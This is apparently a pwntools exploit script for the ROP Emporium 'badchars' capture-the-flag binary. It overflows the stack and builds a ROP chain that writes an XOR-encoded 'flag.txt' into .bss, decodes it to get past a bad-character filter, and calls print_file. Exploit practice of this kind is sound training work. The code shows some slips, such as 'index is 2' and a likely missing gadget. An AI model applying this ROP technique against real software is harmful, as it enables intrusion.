#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template badchars
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('badchars')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

print ('''
                             usefulGadgets
        00400628 45 30 37        XOR        byte ptr [R15],R14B
        0040062b c3              RET
        0040062c 45 00 37        ADD        byte ptr [R15],R14B
        0040062f c3              RET
        00400630 45 28 37        SUB        byte ptr [R15],R14B
        00400633 c3              RET
        00400634 4d 89 65 00     MOV        qword ptr [R13],R12
        00400638 c3              RET
        00400639 0f 1f 80        NOP        dword ptr [RAX]
                 00 00 00 00
''')


filename = './badchars'
e = ELF(filename)
io = process(filename)

rop = ROP(e)

print("\nusefulGadgets: ")
print(e.disasm(0x00400634,1)+"\n")
mov = p64(0x00400634) #00400634 4d 89 65 00 MOV qword ptr [R13],R12

print(e.disasm(0x00400628,1)+"\n")
xor = p64(0x00400628) #00400628 45 30 37 XOR byte ptr [R15],R14B

print("\nRopper Gadgets: ")
print(e.disasm(0x000000000040069c,5)+"\n")
pop_12_13_14_15_ret = p64(rop.r12.address) # 0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret;

print(e.disasm(0x00000000004006a0,1)+"\n")
pop_14_15_ret = p64(rop.r14.address) # 0x00000000004006a0: pop r14; pop r15; ret;

#print("\nwritable memory .bss: ")
bss = e.bss()
#print(hex(e.bss()))


ctf_flag="flag.txt" 
badchars = ['x','g','a','.'] # need to sort
indexes = []
for x in badchars:
    indexes.append(int(ctf_flag.index(x)))
    
indexes.sort() # l82
def string_flag(string):
    rop = ROP(e)
    
    rop.raw(pop_12_13_14_15_ret)
    rop.raw(string)
    rop.raw(p64(bss))
    
    return rop.chain()

def xor_chars(index):
    rop = ROP(e)
    if index is 2:
        rop.raw(0x4)
        rop.raw(p64(bss+index))
        rop.raw(mov)
        rop.raw(xor)
    else:
        rop.raw(pop_14_15_ret)
        rop.raw(0x4)
        rop.raw(p64(bss+index))
        rop.raw(xor)

    return rop.chain()


rop.call

buf = b""
buf += cyclic(40)

buf += string_flag(b'flec*t|t')

for x in range(len(indexes)):
    buf += xor_chars(indexes[x])

_print_file = ROP(e)
_print_file.call('print_file', [bss])

buf += _print_file.chain()

with open("tmp","w") as f:
    f.write(buf)
    f.close()

io.recvuntil('>')
io.sendline(buf)
io.recvuntil('!\n')
flag = io.recvline().decode().rstrip()
log.success("Flag: {}".format(flag))
